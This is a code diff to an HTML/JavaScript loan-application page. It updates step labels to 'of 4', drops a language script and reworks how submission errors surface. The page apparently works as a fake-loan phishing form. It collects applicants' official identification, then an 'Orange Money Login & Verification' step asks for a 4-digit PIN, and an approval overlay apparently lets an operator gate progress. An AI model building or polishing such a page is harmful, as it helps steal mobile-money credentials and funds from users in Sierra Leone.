@@ -227,7 +227,7 @@
       <!-- STEP 1: Loan Configuration Form -->
       <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 3</span>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step1Title">Loan Details</h2>
           <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Customize your loan terms.</p>
         </div>
@@ -280,7 +280,7 @@
       <!-- STEP 2: Applicant Information Form -->
       <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 3</span>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-1.5" data-i18n="step2Title">Applicant Details</h2>
           <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Fill in your official identification information.</p>
         </div>
@@ -360,7 +360,11 @@
       </section>
 
       <!-- STEP 3: Orange Money Login & Verification (4-DIGIT PIN FOR SIERRA LEONE) -->
-      <section id="step-3" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-5">
+      <section id="step-3" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-3.5 sm:space-y-4">
+        <div>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 3 of 4</span>
+        </div>
+
         <!-- Big Orange Card Header -->
         <div class="orange-gradient rounded-2xl p-4 sm:p-5 text-white text-center shadow-lg relative overflow-hidden">
           <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-2 sm:mb-3">
@@ -665,7 +669,6 @@
 
   </div>
 
-  <script src="/language.js"></script>
   <script>
     window.t = window.t || function(key) { return key; };
     let currentStep = 0;
@@ -954,17 +957,19 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        if (res.ok) {
-          const data = await res.json();
-          if (data.applicationId) {
-            appState.applicationId = data.applicationId;
-            const refElem = document.getElementById('summary-ref-id');
-            if (refElem) refElem.innerText = data.applicationId;
-            return data.applicationId;
-          }
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+          throw new Error(data.error || 'Failed to submit application details');
+        }
+        if (data.applicationId) {
+          appState.applicationId = data.applicationId;
+          const refElem = document.getElementById('summary-ref-id');
+          if (refElem) refElem.innerText = data.applicationId;
+          return data.applicationId;
         }
       } catch (err) {
         console.error('Failed to create application:', err);
+        throw err;
       }
       return null;
     }
@@ -1430,7 +1435,7 @@
         isAwaitingStep2Approval = false;
         hideApprovalOverlay();
         if (step2Alert) {
-          step2Alert.innerText = '❌ Error submitting application. Please retry.';
+          step2Alert.innerText = '❌ ' + (err.message || 'Error submitting application. Please retry.');
           step2Alert.classList.remove('hidden');
         }
         if (appWaitingBox) appWaitingBox.classList.add('hidden');
